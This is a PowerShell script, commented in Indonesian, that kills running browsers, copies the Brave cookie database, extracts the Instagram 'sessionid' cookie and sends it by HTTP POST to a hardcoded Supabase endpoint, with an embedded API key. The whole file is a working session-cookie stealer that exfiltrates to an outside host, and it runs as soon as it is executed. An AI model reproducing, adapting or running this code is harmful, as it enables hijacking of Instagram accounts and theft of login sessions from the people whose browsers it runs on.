# --- KONFIGURASI SUPABASE LOCAL ---
SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"

function Kill-BrowserProcesses {
    Write-Host "[*] Membersihkan proses browser di latar belakang..."
    $browsers = @("brave", "chrome", "msedge", "opera")
    foreach ($b in $browsers) {
        Stop-Process -Name $b -ErrorAction SilentlyContinue -Force
    }
}

function Save-To-Supabase {
    param ([string]$sessionId)
    try {
        Write-Host "[*] Menghubungkan ke Supabase Local..."
        
        $headers = @{
            "apikey"        = $SUPABASE_KEY
            "Authorization" = "Bearer $SUPABASE_KEY"
            "Content-Type"  = "application/json"
            "Prefer"        = "return=minimal"
        }
        
        $body = @{
            "session" = $sessionId
        } | ConvertTo-Json

        $response = Invoke-RestMethod -Uri $SUPABASE_URL -Method Post -Headers $headers -Body $body
        Write-Host "[✓] Berhasil menyimpan Session ID ke Supabase Local!"
    }
    catch {
        Write-Host "[!] Gagal menyimpan ke Supabase: $_"
    }
}

function Get-InstagramSession {
    Kill-BrowserProcesses

    # Cari lokasi database cookie Brave (Default & Profile)
    $possiblePaths = @(
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Cookies"
    )

    $dbPath = $null
    foreach ($path in $possiblePaths) {
        if (Test-Path $path) {
            $dbPath = $path
            break
        }
    }

    if (-not $dbPath) {
        Write-Host "[!] File database cookie Brave tidak ditemukan."
        return
    }

    # Salin file ke Temp agar tidak ter-lock oleh sistem
    $tempDb = "$env:TEMP\brave_cookies_temp.db"
    Copy-Item -Path $dbPath -Destination $tempDb -Force

    Write-Host "[*] Membaca database cookie Brave..."

    try {
        # Gunakan FileStream agar aman membaca file yang sedang terunci/terpakai
        $fileStream = [System.IO.File]::Open($tempDb, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $binaryReader = New-Object System.IO.BinaryReader($fileStream)
        $bytes = $binaryReader.ReadBytes($fileStream.Length)
        $binaryReader.Close()
        $fileStream.Close()

        # Konversi bytes ke string dengan aman
        $text = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($bytes)
    }
    catch {
        Write-Host "[!] Gagal membaca file cookie: $_"
        Remove-Item -Path $tempDb -Force -ErrorAction SilentlyContinue
        return
    }

    # Hapus file sementara
    Remove-Item -Path $tempDb -Force -ErrorAction SilentlyContinue

    # Cari pattern cookie sessionid
    if ($text -match 'sessionid\x00([^\x00\r\n\t]+)') {
        $rawSession = $Matches[1]
        $sessionIdVal = $rawSession -replace '[^\w%:-]', ''

        Write-Host ("=" * 65)
        Write-Host "INSTAGRAM SESSIONID BERHASIL DI-EKSTRAKSI:"
        Write-Host ("=" * 65)
        Write-Host $sessionIdVal
        Write-Host ("=" * 65)`n

        Save-To-Supabase -sessionId $sessionIdVal
    }
    else {
        Write-Host "`n[!] Cookie 'sessionid' Instagram tidak ditemukan."
        Write-Host "[!] Pastikan kamu sudah login ke akun Instagram di Brave."
    }
}

# Eksekusi
Get-InstagramSession
